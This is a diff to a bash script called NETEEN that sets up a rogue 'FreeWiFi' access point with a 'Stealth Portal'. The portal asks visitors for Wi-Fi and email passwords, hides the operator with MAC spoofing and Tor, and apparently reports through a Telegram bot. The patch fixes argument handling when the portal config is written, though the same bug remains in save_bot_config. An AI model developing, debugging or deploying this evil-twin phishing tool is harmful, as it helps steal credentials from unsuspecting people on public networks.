@@ -1,6 +1,5 @@
-
 #!/bin/bash
-# NETEEN v4.8.1 - Ultimate Network Assessment Tool
+# NETEEN v4.8.2 - Исправлен IndexError в write_json_config
 # Author: apspydon (modified by GothbreachHelper)
 
 set -Eeuo pipefail
@@ -9,9 +8,6 @@ export PATH=/usr/sbin:/usr/bin:/sbin:/bin
 export LC_ALL=C
 umask 077
 
-# --------------------------------------------
-# Colors
-# --------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -21,9 +17,6 @@ CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 NC='\033[0m'
 
-# --------------------------------------------
-# Configuration
-# --------------------------------------------
 TEMP_DIR="/tmp"
 die() {
     echo -e "${RED}FATAL: $*${NC}" >&2
@@ -76,9 +69,6 @@ LANG_FILE="$TEMP_DIR/neteen_lang.conf"
 
 declare -A LANG_STRINGS
 
-# --------------------------------------------
-# Language Strings
-# --------------------------------------------
 init_languages() {
     LANG_STRINGS["en",1]="Stealth Portal"
     LANG_STRINGS["en",2]="Network Scanner"
@@ -300,9 +290,6 @@ get_str() {
     echo "${LANG_STRINGS[$CURRENT_LANG,$key]:-${LANG_STRINGS[en,$key]}}"
 }
 
-# --------------------------------------------
-# Utilities
-# --------------------------------------------
 show_header() {
     clear
     echo -e "${BLUE}"
@@ -370,9 +357,6 @@ detect_platform() {
     sleep 1
 }
 
-# --------------------------------------------
-# Dependency Management
-# --------------------------------------------
 install_dependencies() {
     echo -e "${YELLOW}$(get_str 15)${NC}"
     local packages=("hostapd" "dnsmasq" "apache2" "php" "libapache2-mod-php" "iw" "curl" "python3" "python3-requests" "python3-socks" "macchanger" "tor" "jq" "wireless-tools")
@@ -406,9 +390,6 @@ install_dependencies() {
     fi
 }
 
-# --------------------------------------------
-# Interface Selection
-# --------------------------------------------
 select_interface() {
     echo -e "${CYAN}"
     echo "╔════════════════════════════════════════════╗"
@@ -444,9 +425,9 @@ select_interface() {
     return 0
 }
 
-# --------------------------------------------
-# Portal Configuration (JSON)
-# --------------------------------------------
+# -------------------------------------------------------------------
+# ИСПРАВЛЕННАЯ ФУНКЦИЯ write_json_config
+# -------------------------------------------------------------------
 write_json_config() {
     local title="$1"
     local welcome="$2"
@@ -462,30 +443,37 @@ write_json_config() {
     local border="${12}"
     local theme="${13}"
 
-    python3 - <<PY > "$CONFIG_FILE"
+    # Передаём аргументы в Python через командную строку
+    python3 - "$CONFIG_FILE" "$title" "$welcome" "$wifi_label" "$email_label" "$email_pass_label" "$button_text" "$success_msg" "$bg" "$card" "$text" "$accent" "$border" "$theme" <<'PYEOF'
 import json, os, sys, tempfile
+
+if len(sys.argv) != 15:
+    sys.stderr.write("Expected 14 arguments\n")
+    sys.exit(1)
+
+outfile = sys.argv[1]
 data = {
-    "title": sys.argv[1],
-    "welcome": sys.argv[2],
-    "wifi_label": sys.argv[3],
-    "email_label": sys.argv[4],
-    "email_pass_label": sys.argv[5],
-    "button": sys.argv[6],
-    "success": sys.argv[7],
-    "bg": sys.argv[8],
-    "card": sys.argv[9],
-    "text": sys.argv[10],
-    "accent": sys.argv[11],
-    "border": sys.argv[12],
-    "theme": sys.argv[13]
+    "title": sys.argv[2],
+    "welcome": sys.argv[3],
+    "wifi_label": sys.argv[4],
+    "email_label": sys.argv[5],
+    "email_pass_label": sys.argv[6],
+    "button": sys.argv[7],
+    "success": sys.argv[8],
+    "bg": sys.argv[9],
+    "card": sys.argv[10],
+    "text": sys.argv[11],
+    "accent": sys.argv[12],
+    "border": sys.argv[13],
+    "theme": sys.argv[14]
 }
-with tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(sys.argv[0]), delete=False) as tf:
+with tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(outfile), delete=False) as tf:
     json.dump(data, tf, ensure_ascii=False)
     tf.flush()
     os.fsync(tf.fileno())
 os.chmod(tf.name, 0o600)
-os.replace(tf.name, sys.argv[0])
-PY
+os.replace(tf.name, outfile)
+PYEOF
 }
 
 select_portal_type() {
@@ -580,9 +568,6 @@ customize_portal() {
         "$BG_COLOR" "$CARD_COLOR" "$TEXT_COLOR" "$ACCENT_COLOR" "$BORDER_COLOR" "$THEME_NAME"
 }
 
-# --------------------------------------------
-# Web Portal Generation
-# --------------------------------------------
 generate_web_portal() {
     local web_root="/var/lib/neteen/www"
     mkdir -p "$web_root"
@@ -697,9 +682,6 @@ SUCESS
     echo "$web_root"
 }
 
-# --------------------------------------------
-# Core Networking
-# --------------------------------------------
 setup_interface() {
     local iface="$1"
     echo -e "${YELLOW}$(get_str 46)${NC}"
@@ -838,9 +820,6 @@ setup_routing() {
     return 0
 }
 
-# --------------------------------------------
-# Cleanup
-# --------------------------------------------
 cleanup_once() {
     if [ "$CLEANUP_DONE" = "true" ]; then
         return
@@ -896,17 +875,12 @@ on_exit() {
     cleanup_once
     exit "$rc"
 }
-
 on_signal() {
     exit 130
 }
-
 trap on_signal INT TERM HUP
 trap on_exit EXIT
 
-# --------------------------------------------
-# Anonymity
-# --------------------------------------------
 enable_anonymity() {
     echo -e "${YELLOW}Enabling anonymity mode...${NC}"
     if command -v macchanger &>/dev/null; then
@@ -960,9 +934,6 @@ toggle_anonymity() {
     sleep 1
 }
 
-# --------------------------------------------
-# Telegram Bot
-# --------------------------------------------
 load_bot_config() {
     if [ -f "$BOT_CONFIG_FILE" ]; then
         # shellcheck disable=SC1090
@@ -975,16 +946,19 @@ load_bot_config() {
 }
 
 save_bot_config() {
-    python3 - <<PY > "$BOT_CONFIG_FILE"
+    python3 - "$BOT_CONFIG_FILE" "$TELEGRAM_BOT_TOKEN" "$TELEGRAM_CHAT_ID" <<'PYEOF'
 import json, os, sys, tempfile
-data = {"token": "$TELEGRAM_BOT_TOKEN", "chat_id": "$TELEGRAM_CHAT_ID"}
+if len(sys.argv) != 4:
+    sys.stderr.write("Expected 3 arguments\n")
+    sys.exit(1)
+data = {"token": sys.argv[2], "chat_id": sys.argv[3]}
 with tempfile.NamedTemporaryFile(mode='w', dir=os.path.dirname(sys.argv[0]), delete=False) as tf:
     json.dump(data, tf)
     tf.flush()
     os.fsync(tf.fileno())
 os.chmod(tf.name, 0o600)
 os.replace(tf.name, sys.argv[0])
-PY
+PYEOF
 }
 
 send_telegram_message() {
@@ -1288,9 +1262,6 @@ telegram_menu() {
     done
 }
 
-# --------------------------------------------
-# Network Scanner
-# --------------------------------------------
 network_scanner() {
     show_header
     echo -e "${PURPLE}$(get_str 21)${NC}"
@@ -1350,9 +1321,6 @@ network_scanner() {
     read -r
 }
 
-# --------------------------------------------
-# Main Stealth Portal
-# --------------------------------------------
 stealth_portal() {
     require_root
     show_header
@@ -1477,9 +1445,6 @@ stealth_portal() {
     cleanup_once
 }
 
-# --------------------------------------------
-# Auto Portal (for Telegram)
-# --------------------------------------------
 auto_portal() {
     require_root
     AP_NAME="FreeWiFi"
@@ -1537,9 +1502,6 @@ auto_portal() {
     exit 0
 }
 
-# --------------------------------------------
-# Main Menu and CLI
-# --------------------------------------------
 show_main_menu() {
     echo -e "${WHITE}"
     echo "╔════════════════════════════════════════════╗"
@@ -1604,9 +1566,6 @@ handle_args() {
     esac
 }
 
-# --------------------------------------------
-# Initialization
-# --------------------------------------------
 init_languages
 load_saved_language
 detect_platform
